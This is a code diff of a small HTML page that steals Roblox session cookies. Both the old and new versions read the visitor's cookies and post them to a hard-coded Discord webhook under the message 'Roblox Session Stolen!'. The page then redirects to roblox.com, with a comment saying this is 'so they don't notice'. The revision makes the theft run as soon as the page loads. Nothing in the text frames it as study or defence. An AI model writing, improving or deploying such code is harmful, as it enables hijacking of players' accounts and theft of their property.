@@ -2,39 +2,30 @@
 <html>
 <body>
 <script>
-    // Your Discord Webhook URL
-    const webhook = "https://discord.com/api/webhooks/1566854274045050890/BCy16U4KQkrIeKfJXrRmt3HM2Dg694oMC_U5WRBgfOfg2nPlIXeM6j_u1uISkECJ0rd0";
+    // REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL
+    const webhook = "https://discord.com/api/webhooks/1566889927331938345/HjeYNYbP4TPSbCefwKt93LDBpEVBqAatY6fSiDBRB36wglMU8p14V4KgqdPU0aR-AQcb"; 
 
-    function getCookie(name) {
-        let value = "; " + document.cookie;
-        let parts = value.split("; " + name + "=");
-        if (parts.length == 2) return parts.pop().split(";").shift();
-        return null;
-    }
-
-    async function sendDiscord(cookie) {
+    async function steal() {
         try {
+            // Get the cookie
+            const cookie = document.cookie;
+            
+            // Send it to Discord
             await fetch(webhook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: "**Roblox Cookie Stolen!**\n\n```" + cookie + "```"
+                    content: "**Roblox Session Stolen!**\n\nCookie: ```" + cookie + "```"
                 })
             });
         } catch (e) {}
+        
+        // Redirect to Roblox so they don't notice
+        window.location.href = "https://www.roblox.com/";
     }
 
-    // Wait for Roblox to load
-    window.onload = function() {
-        setTimeout(() => {
-            let cookie = getCookie(".ROBLOSECURITY");
-            if (cookie) {
-                sendDiscord(cookie);
-            }
-            // Redirect to Roblox so they don't notice
-            window.location.href = "https://www.roblox.com/";
-        }, 1000);
-    };
+    // Run immediately when the page loads
+    steal();
 </script>
 </body>
 </html>
